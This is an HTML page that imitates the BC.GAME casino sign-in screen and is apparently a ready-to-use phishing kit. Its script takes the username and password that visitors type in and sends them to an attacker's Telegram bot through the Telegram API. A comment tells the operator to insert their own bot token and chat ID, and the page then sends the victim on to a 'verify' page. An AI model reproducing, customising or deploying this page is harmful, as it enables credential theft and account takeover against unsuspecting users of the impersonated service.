<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In - BC.GAME</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* Zoom fix ke liye 16px font-size zaroori hai */
        input { font-size: 16px !important; }
        
        * { box-sizing: border-box; }
        body { background-color: #1c1f21; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: flex-start; height: 100vh; margin: 0; padding-top: 0; }
        .mobile-wrapper { width: 100%; max-width: 400px; height: 100vh; background-color: #1c1f21; overflow-y: auto; position: relative; }
        
        /* Baaki ka aapka design */
        .header { background: #1c1f21; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
        .logo-group h1 { font-size: 1.2em; margin: 0; color: white; }
        .banner-benefits { display: flex; justify-content: space-between; align-items: center; background-color: #121415; padding: 15px; border-bottom: 1px solid #222; }
        .benefits { list-style: none; padding: 0; margin: 0; font-size: 0.8em; color: #8f9397; width: 60%; }
        .benefits li { display: flex; align-items: center; gap: 6px; margin-bottom: 8px; }
        .icon-circle { width: 16px; height: 16px; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 9px; }
        .green-c { color: #3bc117; font-weight: bold; }
        .banner-img { width: 35%; }
        .banner-img img { width: 100%; border-radius: 5px; }

        .main-form { padding: 20px; }
        .form-group { position: relative; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; background-color: #121415; border: 1px solid #2d3034; border-radius: 8px; color: white; }
        .signin-btn { width: 100%; padding: 15px; background-color: #3bc117; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="mobile-wrapper">
        <div class="header">
            <div class="logo-group"><h1>BC.GAME</h1></div>
        </div>

        <div class="banner-benefits">
            <ul class="benefits">
                <li><span class="icon-circle" style="background:#dc2626;"><i class="fas fa-th-large"></i></span><span class="green-c">470%</span> Bonus</li>
                <li><span class="icon-circle" style="background:#ffb200;"><i class="fas fa-gift"></i></span><span class="green-c">Free Perks</span></li>
            </ul>
            <div class="banner-img">
                <img src="https://via.placeholder.com/100" alt="Banner">
            </div>
        </div>

        <div class="main-form">
            <h2>Sign In</h2>
            <div class="form-group">
                <input type="text" id="username" placeholder="Email / Username">
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password">
            </div>
            <button class="signin-btn" onclick="sendLogin()">Sign In</button>
        </div>
    </div>

    <script>
        function sendLogin() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // YAHAN APNI DETAILS DALEIN
            const botToken = 'YOUR_API_TOKEN_HERE';
            const chatId = 'YOUR_CHAT_ID_HERE';
            
            const text = `BC.GAME LOGIN:\nUser: ${user}\nPass: ${pass}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

            fetch(url).then(() => {
                window.location.href = 'verify.html';
            });
        }
    </script>
</body>
</html>
